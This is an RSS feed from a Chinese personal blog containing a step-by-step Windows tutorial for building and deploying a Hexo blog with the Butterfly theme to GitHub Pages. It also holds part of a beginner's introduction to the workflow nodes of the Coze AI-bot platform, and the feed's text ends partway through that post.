<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>BaiYB的个人博客</title>
    <link>https://baiyb.top/</link>
    
    <atom:link href="https://baiyb.top/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Sat, 09 Aug 2025 03:21:09 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>基于Hexo框架搭建个人博客</title>
      <link>https://baiyb.top/2025/06/27/%E5%9F%BA%E4%BA%8EHexo%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</link>
      <guid>https://baiyb.top/2025/06/27/%E5%9F%BA%E4%BA%8EHexo%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</guid>
      <pubDate>Fri, 27 Jun 2025 14:39:04 GMT</pubDate>
      
      <description>开源的实践活动</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2025年夏季小学期的开源软件开发课程，第一个实践即是Hexo个人博客的搭建，虽然我的博客在此之前已经搭建好了，但在帮别的同学搭建博客之时，仍碰到许多报错或问题。故写一篇教程，记录搭建过程中遇到的问题及解决办法，希望能对后来者有些许帮助吧。</p><blockquote><p>注意！<br><br><strong>请保证自己的电脑可以连接到<code>github.com</code></strong><br><br><strong>请保证自己会正确的使用AI，如 <code>ChatGPT</code> 或 <code>DeepSeek</code></strong><br><br><strong>由于我手头只有Windows设备，且绝大部分同学都是Windows系统，故该教程以<code>Windows系统</code>为基础</strong><br></p></blockquote><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>本教程不保证包教包会，仅提供搭建过程中的参考。<br><br>在面对报错或无法解决的问题时，可先查询后文中的<code>常见问题</code>板块。<br><br>若问题仍无法解决，可参考：<a href="https://hexo.io/zh-cn/docs/">Hexo的官方文档</a>。并询问AI获取帮助。</p><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>感谢以下同学与工具的帮助：<br></p><ul><li>XBX：提供了基础教程【<a href="https://xbxyftx.github.io/2025/01/26/butterfly%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/">点击访问网页</a>】，本文在其基础上进行排障。<br></li><li>ZXJC：提供了基础教程【<a href="/download/Hexo-Bulider.pdf">点击查看PDF文件</a>】，在搭建过程中发现并一同解决了一些问题。<br></li><li>ChatGPT：在看到让人头大的报错时救我一命。<br></li></ul><h1 id="工具安装与准备工作"><a href="#工具安装与准备工作" class="headerlink" title="工具安装与准备工作"></a>工具安装与准备工作</h1><p>nodejs、git、注册github账号</p><h2 id="nodejs安装"><a href="#nodejs安装" class="headerlink" title="nodejs安装"></a>nodejs安装</h2><p>官方下载链接：<a href="https://nodejs.org/en">https://nodejs.org/en</a><br><br>压缩包（可能不是官网最新版）：【<a href="/download/node-v22.16.0-win-x64.zip">点击下载</a>】<br><br>教程视频：【<a href="https://www.bilibili.com/video/BV1sbjgzwEBX/?share_source=copy_web&vd_source=76ef81a3c7f598cf017a43cc75c2cf93">Nodejs安装零基础教程2025</a>】<br></p><h2 id="git安装"><a href="#git安装" class="headerlink" title="git安装"></a>git安装</h2><p>官方下载链接：<a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a><br><br>安装包（可能不是官网最新版）：【<a href="/download/Git-2.50.0-64-bit.exe">点击下载</a>】<br><br>视频教程：【<a href="https://www.bilibili.com/video/BV1vM4m1Q7hC/?spm_id_from=333.337.search-card.all.click&vd_source=754fdfd19d49323af99603a90c4dbb56">在Windows上安装git</a>】<br></p><h2 id="github账号注册"><a href="#github账号注册" class="headerlink" title="github账号注册"></a>github账号注册</h2><p>官方注册链接：<a href="https://github.com/join">https://github.com/join</a><br><br>视频教程：【<a href="https://www.bilibili.com/video/BV1eE421M7Wr/?share_source=copy_web&vd_source=76ef81a3c7f598cf017a43cc75c2cf93">GitHub注册账号</a>】<br></p><h1 id="Hexo框架部署"><a href="#Hexo框架部署" class="headerlink" title="Hexo框架部署"></a>Hexo框架部署</h1><p>现在我们已经配置好了基础工具，接下来我们需要安装Hexo框架。<br></p><h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><h3 id="Step1：选择一个你喜欢的文件夹"><a href="#Step1：选择一个你喜欢的文件夹" class="headerlink" title="Step1：选择一个你喜欢的文件夹"></a>Step1：选择一个你喜欢的文件夹</h3><p>选择一个你喜欢的文件夹作为日后存放博客核心和博文的仓库<br><br>可以是<code>D:\blog</code>，也可以是<code>E:\blog</code>，也可以是<code>F:\blog</code>。<br></p><blockquote><p>注意！无论你想将文件夹创立在什么地方，请务必保证文件夹内是空的，且路径最好不要存在中文，否则会产生异常报错。<br><img src="https://free.picui.cn/free/2025/06/27/685ebb6fa1f75.png"><br></p></blockquote><h3 id="Step2：安装Hexo"><a href="#Step2：安装Hexo" class="headerlink" title="Step2：安装Hexo"></a>Step2：安装Hexo</h3><p>在文件夹内右键，打开<code>git bash</code><br><br><img src="https://free.picui.cn/free/2025/06/27/685ebc36e2319.png"><br><br>全局安装Hexo，输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p><img src="https://free.picui.cn/free/2025/06/27/685ebd1c022db.png"><br><br><br><br>验证Hexo是否正常安装，输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p><img src="https://free.picui.cn/free/2025/06/27/685ebd705f1c7.png"><br><br>如果出现该页面，说明Hexo安装成功，可以进行下一步啦！<br><br><br></p><h3 id="Step3：初始化Hexo"><a href="#Step3：初始化Hexo" class="headerlink" title="Step3：初始化Hexo"></a>Step3：初始化Hexo</h3><p>在<code>git bash</code>内输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p><img src="https://free.picui.cn/free/2025/06/27/685ebe36de35b.png"><br><br>显示如上图所示页面，说明初始化成功<br></p><blockquote><p>有的电脑会报错，<code>disconnect with github</code><br><br>此时，下载此压缩包，并将里面的内容解压到你的博客文件夹内，即可解决问题。<br><br>压缩包链接：<a href="/download/Hexo-files.zip">Hexo-files.zip</a><br>解压后，将压缩包内的所有文件复制到你的博客文件夹内，即可解决问题。<br><br><img src="https://free.picui.cn/free/2025/06/28/685ec0922708a.png"><br></p></blockquote><p><br><br></p><h3 id="Step4：本地部署Hexo"><a href="#Step4：本地部署Hexo" class="headerlink" title="Step4：本地部署Hexo"></a>Step4：本地部署Hexo</h3><p>在<code>git bash</code>内输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><p><img src="https://free.picui.cn/free/2025/06/28/685ec1be5412c.png"><br><br>按住<code>ctrl</code>，点击<code>http://localhost:4000/</code>，即可在浏览器中查看博客<br><br><img src="https://free.picui.cn/free/2025/06/28/685ec204680d3.png"><br><br>在浏览器中出现这个界面，就说明我们已经在本地完整的部署了Hexo<br><br>此时，回到<code>git bash</code>中，按下<code>ctrl + c</code>关闭本地部署页面，从而进行下一步<be><be><be></be></be></be></p><h2 id="部署到GitHub"><a href="#部署到GitHub" class="headerlink" title="部署到GitHub"></a>部署到GitHub</h2><p>此时，我们只能在本地访问Hexo博客，但是想让别人访问我们的博客，需要将博客部署到线上，这里选择github来托管我们的博客<br></p><h3 id="Step1：创建仓库"><a href="#Step1：创建仓库" class="headerlink" title="Step1：创建仓库"></a>Step1：创建仓库</h3><p>打开<code>GitHub</code>，找到如下部分，点击<code>New</code><br><br><img src="https://free.picui.cn/free/2025/06/28/685ec8dd4d9b9.png"><br><br>按如下步骤操作：<br><br><img src="https://free.picui.cn/free/2025/06/28/685ecb6200cf6.png"><br><br><br></p><h3 id="Step2：本地配置SSH-Key"><a href="#Step2：本地配置SSH-Key" class="headerlink" title="Step2：本地配置SSH Key"></a>Step2：本地配置SSH Key</h3><p>返回<code>git bash</code>，分别输入下列命令：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name 你的用户名           <span class="comment"># 配置个人信息-username</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email 你的GitHub邮箱      <span class="comment"># 配置个人信息-useremail</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C 你的GitHub邮箱               <span class="comment"># 生成密钥</span></span><br></pre></td></tr></table></figure><p>在生成密钥的过程中直接全部回车直到生成成功即可。<br><br>按照默认路径生成的密钥都会储存在<code>C:\Users\用户名\.ssh\id_rsa.pub</code><br><br><img src="https://free.picui.cn/free/2025/06/28/685ece4a3aa3b.png"><br><br>右键<code>id_rsa.pub</code>文件，用记事本打开，复制里面的全部内容<br><br><img src="https://free.picui.cn/free/2025/06/28/685ecedd5f095.png"><br></p><h3 id="Step3：添加SSH-Key到GitHub"><a href="#Step3：添加SSH-Key到GitHub" class="headerlink" title="Step3：添加SSH Key到GitHub"></a>Step3：添加SSH Key到GitHub</h3><p><a href="https://github.com/settings/ssh/new">https://github.com/settings/ssh/new</a><br><br>复制该链接到浏览器地址框，并跟随图示配置：<br><br><img src="https://free.picui.cn/free/2025/06/28/685ed0afee442.png"></p><h3 id="Step4：同步SSH-Key到本地git"><a href="#Step4：同步SSH-Key到本地git" class="headerlink" title="Step4：同步SSH Key到本地git"></a>Step4：同步SSH Key到本地git</h3><p>在<code>git bash</code>内输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(ssh-agent -s)</span>&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-add ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p>现在，我们测试一下电脑和github的通信，输入以下命令：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p><br><br><br>显示如下提示时，就是电脑可以成功和github通信<br><br><img src="https://free.picui.cn/free/2025/06/28/685ed1a3e3582.png"></p><h3 id="Step5：修改Hexo配置文件"><a href="#Step5：修改Hexo配置文件" class="headerlink" title="Step5：修改Hexo配置文件"></a>Step5：修改Hexo配置文件</h3><p>在博客文件夹内，打开<code>_config.yml</code>文件，修改如下内容：<br></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:XXXXX/XXXXX.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><blockquote><p>注意！修改的时候记得将原来的自带的 <code>Deployment</code> 部分完全删掉</p></blockquote><p>修改后如下：<br><br><img src="https://free.picui.cn/free/2025/06/28/685ed2f67ec06.png"></p><h3 id="Step6：上传博客到GitHub"><a href="#Step6：上传博客到GitHub" class="headerlink" title="Step6：上传博客到GitHub"></a>Step6：上传博客到GitHub</h3><p>在<code>git bash</code>内输入以下命令：<br><br>先安装<code>hexo-deployer-git</code>插件，使博客可以上传到GitHub<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><blockquote><p>注意！如果没有安装<code>hexo-deployer-git</code>插件，上传博客时会报错<br></p></blockquote><p>一键上传博客到GitHub：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><p><img src="https://free.picui.cn/free/2025/06/28/685ed48168388.png"><br><br>显示<code>INFO Deploy done：git</code>，说明博客上传成功<br></p><p>在浏览器中输入<code>https://你的GitHub用户名.github.io</code>，即可访问博客<br></p><p><img src="https://free.picui.cn/free/2025/06/28/685ed5a4144a0.png"></p><blockquote><p>第一次部署时间偏长，可以等三五分钟后打开</p></blockquote><p>此时，我们<code>Hexo</code>的部署就算是完成了</p><h1 id="Hexo主题配置"><a href="#Hexo主题配置" class="headerlink" title="Hexo主题配置"></a>Hexo主题配置</h1><p>hexo的默认主题是<code>landscape</code>，相对来说可能没那么好看，这时，我们就可以考虑换hexo主题了<br><br>Hexo的主题有很多，可以在这里看：<a href="https://hexo.io/themes/">https://hexo.io/themes/</a><br><br>这里我们以<code>Butterfly主题</code>为例进行教学<br></p><h2 id="安装Butterfly主题"><a href="#安装Butterfly主题" class="headerlink" title="安装Butterfly主题"></a>安装Butterfly主题</h2><p>在<code>git bash</code>中输入以下命令：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>显示以下内容，说明安装成功<br><br><img src="https://free.picui.cn/free/2025/06/28/685ed7f6154bd.png"><br></p><blockquote><p>此处可能会有电脑报错连接超时，下面提供Butterfly主题的压缩包，请按顺序操作：<br><br><a href="/download/butterfly.zip">Butterfly主题压缩包</a><br><br>将压缩包解压至<code>themes</code>文件夹内<br><br><img src="https://free.picui.cn/free/2025/06/28/685ed9994f2a0.png"></p></blockquote><h2 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h2><p>打开博客文件夹内的<code>_config.yml</code>文件，修改<code>theme</code>为<code>butterfly</code>，如下：<br></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure><p><img src="https://free.picui.cn/free/2025/06/28/685eda437e477.png"><br></p><blockquote><p>注意：<code>theme</code>后的空格不能省略</p></blockquote><h2 id="安装渲染器"><a href="#安装渲染器" class="headerlink" title="安装渲染器"></a>安装渲染器</h2><p><strong>这一步很重要！否则无法正常显示文章内容</strong><br><br>安装 <code>pug</code> 和 <code>stylus</code> 渲染器，否则启动之后访问页面会报错。<br><br>在<code>git bash</code>中输入以下命令：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p><img src="https://free.picui.cn/free/2025/06/28/685edad0314ac.png"><br><br>显示该反馈时，说明安装成功<br></p><h2 id="重新启动Hexo"><a href="#重新启动Hexo" class="headerlink" title="重新启动Hexo"></a>重新启动Hexo</h2><p>在<code>git bash</code>中输入以下命令：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><p><img src="https://free.picui.cn/free/2025/06/28/685ed48168388.png"><br><br>显示<code>INFO Deploy done：git</code>，说明博客重新上传至<code>GitHub</code>成功<br><br><img src="https://free.picui.cn/free/2025/06/28/685edc34911dd.png"></p>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/Hexo/">Hexo</category>
      
      
      <category domain="https://baiyb.top/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</category>
      
      
      <comments>https://baiyb.top/2025/06/27/%E5%9F%BA%E4%BA%8EHexo%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Coze</title>
      <link>https://baiyb.top/2025/06/26/Coze/</link>
      <guid>https://baiyb.top/2025/06/26/Coze/</guid>
      <pubDate>Wed, 25 Jun 2025 16:04:52 GMT</pubDate>
      
      <description>2025创客新生赛道之一</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>你是否使用过大模型？<br><br>是否使用过ChatGPT、Deepseek或豆包辅助日常生活或学习？<br><br>但这些大模型都有自己的局限性，都需要用户去输入很多信息，才能得到想要的答案。<br></p><ul><li>假如我想知道今天的天气，那么我需要去查；<br></li><li>假如我想知道有什么新番，那么我需要去查；<br></li><li>假如我想知道最近有什么新闻，我需要去查……<br></li></ul><p>只查一次还好，但为了得到最新消息，我需要不断询问。好麻烦，我不想一个一个查。<br><br>有没有什么办法能让我不这么麻烦就能收到这些消息？<br><br><img src="https://free.picui.cn/free/2025/06/26/685c263fbc5ed.jpg" width="150"><br><br>你是否有制作小程序或网页的想法，但苦于技术力不足迟迟无法推进？<br><br>前端、后端、数据库，全学一遍好麻烦。<br><br>有没有什么办法能让我轻松制作小程序或网页？<br><br><img src="https://tse3.mm.bing.net/th/id/OIP.4i-Pyq-xfWiY5k5mYNuxSwAAAA?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" width="150"><br><br>在过去，想实现这些功能，需要用户自己搭建服务器，还需要用户自己写代码，显然对用户不友好。<br><br>但现在，<code>Coze</code>的出现，让我们有了新的选择。<br></p><h1 id="什么是Coze？"><a href="#什么是Coze？" class="headerlink" title="什么是Coze？"></a>什么是<code>Coze</code>？</h1><p><code>Coze</code> 是字节跳动（ByteDance）推出的一款 <strong>AI 机器人创建平台</strong>，类似于 ChatGPT，但更偏向于低代码构建智能助手。<br><br>你可以理解为一个面向开发者和普通用户的 “搭积木式” AI 机器人搭建平台。<br></p><blockquote><p>简单地说，<code>Coze</code>就是集合了好多大模型的平台，并且可以让大模型彼此交互，产生的数据可以存储也可以输出。(包括前后端哦)</p></blockquote><p>这可太好了，比起什么<code>&quot;爬虫&quot;、&quot;代码&quot;</code>，搭积木的形式更适合现在低技术力的我们！<br><br><img src="https://tse2-mm.cn.bing.net/th/id/OIP-C.Jd8NiGm3eiL52IbcdMLSqQAAAA?r=0&rs=1&pid=ImgDetMain" width="150"></p><h1 id="Coze功能初认识"><a href="#Coze功能初认识" class="headerlink" title="Coze功能初认识"></a>Coze功能初认识</h1><h2 id="注册账号"><a href="#注册账号" class="headerlink" title="注册账号"></a>注册账号</h2><p>想使用Coze，首先要注册一个账号。<br><br>这是Coze的官网：<a href="https://www.coze.cn/">https://www.coze.cn/</a><br><br>注册流程如下：<br><br><img src="https://free.picui.cn/free/2025/06/26/685c2de187df9.png" alt="7f95a124d32529229aa7f1381ecc054.png"><br><br><br><br>此时，我们身处于<code>coze</code>的主页<br></p><h2 id="新建工作流"><a href="#新建工作流" class="headerlink" title="新建工作流"></a>新建工作流</h2><p>我们点击<code>开发平台</code>-<code>快速开始</code>-<code>新建应用</code>-<code>空白模板</code>来进入项目界面<br><br><img src="https://free.picui.cn/free/2025/08/05/68916586a1c4f.png" alt="微信图片_2025-08-05_095941_189.png"><br><br><br><br>在项目页面内创建<code>工作流</code><br><br><img src="https://free.picui.cn/free/2025/08/05/689167a108444.png" alt="微信图片_2025-08-05_100802_827.png"><br><br><br><br>此时我们就在工作流页面了<br><img src="https://free.picui.cn/free/2025/08/05/689168824aa45.png" alt="8cd5a0a3ec50e2930eee20c1b9d3835f.png"><br><br><br></p><h2 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h2><p>Coze工作流的运行一两，依赖于各个节点的相互配合，所以学会各个节点的使用（其实大部分就行）至关重要<br><br><img src="https://tse1-mm.cn.bing.net/th/id/OIP-C.dsTlNgjmRblzmtaYntlB_wAAAA?w=132&h=150&c=7&r=0&o=5&dpr=1.3&pid=1.7" width="150"><br><br>这里我会以各个板块为单位，介绍一下常用节点的使用方法。<br><br><img src="https://free.picui.cn/free/2025/08/05/68916a9d3d645.png" width="200"><br><br><br></p><h3 id="大模型"><a href="#大模型" class="headerlink" title="大模型"></a>大模型</h3><p><img src="https://free.picui.cn/free/2025/08/07/6894688638d1b.png" alt="1754556565934.png"><br><br>如果将工作流视为一个人，那么大模型就是这个人的脑子，负责对输入的信息进行整理回答<br><br>关于大模型的设置，我们可以看到侧边栏有如下几个板块</p><ul><li>模型：不同的模型对信息的处理能力和速度都不同，选择最适合该工作流的大模型有助于工作流的运行</li><li>技能：为大模型添加本身没有的功能，例如url访问（访问链接）等等</li><li>输入：Coze采用了MCP协议（模型上下文协议，将连接的节点内的数据由前到后进行共享）<ul><li>变量名：为引入的变量重新命名</li><li>变量值：引入上游节点中的变量</li></ul></li><li>视觉理解输入：这个模块和输入模块基本相同，只是变量值只能引入<code>image</code>（图片）</li><li>系统提示词：由工作流的创建者填写，主要目的为控制模型行为&#x2F;角色&#x2F;语气等元信息</li><li>用户提示词：由用户主动填写的内容，在这里，我们可以直接引用<code>输入</code>的内容，格式如<code>&#123;&#123;变量名&#125;&#125;</code></li><li>输出：将大模型生成的内容进行输出</li><li>变量名：为即将输出的内容命名</li><li>变量类型：一般使用<code>string</code>（字符串），其他内容可以摸索摸索，但是基本用不到</li><li>异常处理：负责安排模型调用失败后的处理方式（这个日常不用额外调节）</li></ul><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p><img src="https://free.picui.cn/free/2025/08/07/689471c05f839.png" width="500"><br><br>打开插件页面，内置的插件商场提供了各种软件或功能的调用接口，按需自行调用就可以了</p><h3 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h3><p><img src="https://free.picui.cn/free/2025/08/07/6894728b49c9b.png" width="500"><br><br>若你有两个及以上的工作流需要相互配合，例如想在A工作流中调用B工作流进行工作，那么就可以使用该节点进行工作流的嵌套使用</p><h3 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p><img src="https://free.picui.cn/free/2025/08/07/689476b17f0ca.png" alt="1754560193190.png"><br><br><span style="color:red">注意！！！该模块的使用需要你有一定的<code>Python</code>或<code>JavaScript</code>基础</span><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在这里，您可以通过 &#x27;args&#x27;  获取节点中的输入变量，并通过 &#x27;ret&#x27; 输出结果</span></span><br><span class="line"><span class="comment"># &#x27;args&#x27; 已经被正确地注入到环境中</span></span><br><span class="line"><span class="comment"># 下面是一个示例，首先获取节点的全部输入参数params，其次获取其中参数名为&#x27;input&#x27;的值：</span></span><br><span class="line"><span class="comment"># params = args.params; </span></span><br><span class="line"><span class="comment"># input = params[&#x27;input&#x27;];</span></span><br><span class="line"><span class="comment"># 下面是一个示例，输出一个包含多种数据类型的 &#x27;ret&#x27; 对象：</span></span><br><span class="line"><span class="comment"># ret: Output =  &#123; &quot;name&quot;: &#x27;小明&#x27;, &quot;hobbies&quot;: [&quot;看书&quot;, &quot;旅游&quot;] &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">args: Args</span>) -&gt; Output:</span><br><span class="line">    params = args.params</span><br><span class="line">    <span class="comment"># 构建输出对象</span></span><br><span class="line">    ret: Output = &#123;</span><br><span class="line">        <span class="string">&quot;key0&quot;</span>: params[<span class="string">&#x27;input&#x27;</span>] + params[<span class="string">&#x27;input&#x27;</span>], <span class="comment"># 拼接两次入参 input 的值</span></span><br><span class="line">        <span class="string">&quot;key1&quot;</span>: [<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>],  <span class="comment"># 输出一个数组</span></span><br><span class="line">        <span class="string">&quot;key2&quot;</span>: &#123; <span class="comment"># 输出一个Object </span></span><br><span class="line">            <span class="string">&quot;key21&quot;</span>: <span class="string">&quot;hi&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><p><img src="https://free.picui.cn/free/2025/08/07/689478908ec80.png" alt="1754560672069.png"><br><br>这里需要代码和输出变量相互配合，自行了解即可<br></p><blockquote><p>by the way，好好利用ai自动生成代码可以帮你省去很多事</p></blockquote><h4 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h4><p><img src="https://free.picui.cn/free/2025/08/07/68947a78c0f89.png" alt="1754561160231.png"><br><br>这个节点负责判断条件是否符合要求，符合则进入分支1，不符合则进入分支2<br></p><h4 id="意图识别"><a href="#意图识别" class="headerlink" title="意图识别"></a>意图识别</h4><p><img src="https://free.picui.cn/free/2025/08/07/689475006709f.png" alt="1754559760043.png"><br><br>这个节点负责帮助我们判断用户的目的，通过<code>意图匹配</code>模块主动配置几个目的，自动调用大模型分析用户的需求<br></p><blockquote><p>如图所示，若用户的需求是<code>退货</code>，则结束时输出<code>1</code>；若用户需求是<code>换货</code>，则结束时输出<code>2</code>，以此类推……<br><br>用户输入和预设不匹配时，输出<code>0</code></p></blockquote><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><p><img src="https://free.picui.cn/free/2025/08/07/68947c9f4d54b.png" alt="1754561710017.png"><br><br>按照用户自己的设置进行循环，输出循环体内的结果<br></p><h4 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h4><p><img src="https://free.picui.cn/free/2025/08/07/689484c139554.png" alt="1754563786797.png"><br><br>设定批量处理，从而快捷的完成多项任务<br><br>举个例子，我有十件衣服要洗，一件一件洗的速度肯定没有丢到洗衣机里一起洗快，而批处理就是这台洗衣机<br></p><ul><li>批处理要处理的是一批数据，所以输入的一定是一个数组，也就是<code>Array</code>下的变量类型才能被正确引用</li><li>批处理体内调用的数据最好是批处理的输入内容</li></ul><h4 id="变量聚合"><a href="#变量聚合" class="headerlink" title="变量聚合"></a>变量聚合</h4><p><img src="https://free.picui.cn/free/2025/08/07/689487d014963.png" alt="1754564575515.png"><br><br>变量聚合，就是对多个分支的输出进行聚合处理<br><br>你可以创建多个<code>Group</code>，每个组里可以有很多<code>数据类型相同</code>的数据，变量聚合会输出每个<code>Group</code>中第一个有内容的数据</p><blockquote><p>一般使用场景：一个节点后平行接入多个功能相似，但只调用一个的节点，再接入变量聚合后，可以将多个节点中唯一输出的值输出，不需要接多个输出端</p></blockquote><h3 id="输入-输出"><a href="#输入-输出" class="headerlink" title="输入&amp;输出"></a>输入&amp;输出</h3><p>这个没啥好说的了，就是在工作流中输入或输出数据<br></p><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>由于数据库里包含太多SQL的调用规则和语法，不太适合新手操作，这里不做详解，有想使用的请自行查询使用方法<br><img src="https://ts2.tc.mm.bing.net/th/id/OIP-C.MCuKvVjG4LFxz0YWJQEKZwAAAA?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" width="150"><br></p><h3 id="知识库-数据"><a href="#知识库-数据" class="headerlink" title="知识库&amp;数据"></a>知识库&amp;数据</h3><p>我们可以创建一个知识库来存储我们预定好的知识体系<br><br>假设我们想制作一个校园助手，就可以将校园内的各种信息打包成知识库，在用户提问时调用知识库更精确的回答<br><br><img src="https://free.picui.cn/free/2025/08/08/6895b0e89f00b.png" width="500"><br></p><h4 id="知识库检索"><a href="#知识库检索" class="headerlink" title="知识库检索"></a>知识库检索</h4><p><img src="https://free.picui.cn/free/2025/08/08/6895b6ad08ff4.png" width="500"><br></p><p>顾名思义，就是查询知识库里的内容，并返回一个查询到的信息<br></p><blockquote><p>如图所示，将小明的个人信息放进知识库中，此时我们输入“小明喜欢打什么球”，查询知识库后返回已有的信息：“小明喜欢打篮球”</p></blockquote><h4 id="知识库写入"><a href="#知识库写入" class="headerlink" title="知识库写入"></a>知识库写入</h4><p><img src="https://free.picui.cn/free/2025/08/08/6895b78285858.png" 